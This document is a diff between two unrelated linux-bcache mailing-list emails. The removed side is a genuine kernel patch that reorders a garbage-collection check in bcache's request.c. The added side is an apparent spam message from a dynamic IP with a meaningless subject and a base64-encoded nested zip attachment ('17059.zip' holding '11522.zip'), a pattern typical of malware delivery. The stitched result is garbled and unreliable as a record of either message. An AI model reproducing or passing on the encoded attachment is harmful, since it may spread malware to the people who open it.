@@ -1,46 +1,47 @@
-From: tang.junhui@zte.com.cn
-Subject: [PATCH] bcache: do not subtract sectors_to_gc for bypassd IO
-Date: Tue, 25 Apr 2017 19:02:03 +0800
-Message-ID: <1493118123-9284-1-git-send-email-tang.junhui@zte.com.cn>
+From: <richard@oxbridgeprograms.com>
+Subject: 49807 linux-bcache
+Date: Tue, 25 Apr 2017 12:04:23 -0000
+Message-ID: <149312186336.16693.13133286531857293174@hinet.net>
+Mime-Version: 1.0
+Content-Type: application/zip; name="17059.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-bcache-owner@vger.kernel.org>
-Received: from out1.zte.com.cn ([202.103.147.172]:52291 "EHLO out1.zte.com.cn"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1172415AbdDYLDQ (ORCPT <rfc822;linux-bcache@vger.kernel.org>);
-        Tue, 25 Apr 2017 07:03:16 -0400
+Received: from 114-42-59-248.dynamic-ip.hinet.net ([114.42.59.248]:58668 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1172650AbdDYMEb (ORCPT <rfc822;linux-bcache@vger.kernel.org>);
+        Tue, 25 Apr 2017 08:04:31 -0400
+Content-Disposition: attachment
 Sender: linux-bcache-owner@vger.kernel.org
 List-Id: linux-bcache@vger.kernel.org
-To: kent.overstreet@gmail.com
-Cc: linux-bcache@vger.kernel.org, "tang.junhui" <tang.junhui@zte.com.cn>
+To: linux-bcache@vger.kernel.org
 
-From: "tang.junhui" <tang.junhui@zte.com.cn>
-
-Since bypassed IOs use no bucket, so do not subtract sectors_to_gc to
-trigger gc thread.
-
-Signed-off-by: tang.junhui <tang.junhui@zte.com.cn>
----
- drivers/md/bcache/request.c | 6 +++---
- 1 file changed, 3 insertions(+), 3 deletions(-)
-
-diff --git a/drivers/md/bcache/request.c b/drivers/md/bcache/request.c
-index 76d2087..fa3bfd0 100644
---- a/drivers/md/bcache/request.c
-+++ b/drivers/md/bcache/request.c
-@@ -196,12 +196,12 @@ static void bch_data_insert_start(struct closure *cl)
- 	struct data_insert_op *op = container_of(cl, struct data_insert_op, cl);
- 	struct bio *bio = op->bio, *n;
- 
--	if (atomic_sub_return(bio_sectors(bio), &op->c->sectors_to_gc) < 0)
--		wake_up_gc(op->c);
--
- 	if (op->bypass)
- 		return bch_data_invalidate(cl);
- 
-+	if (atomic_sub_return(bio_sectors(bio), &op->c->sectors_to_gc) < 0)
-+		wake_up_gc(op->c);
-+
- 	/*
- 	 * Journal writes are marked REQ_PREFLUSH; if the original write was a
- 	 * flush, it'll wait on the journal write.
--- 
-2.8.1.windows.1
+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
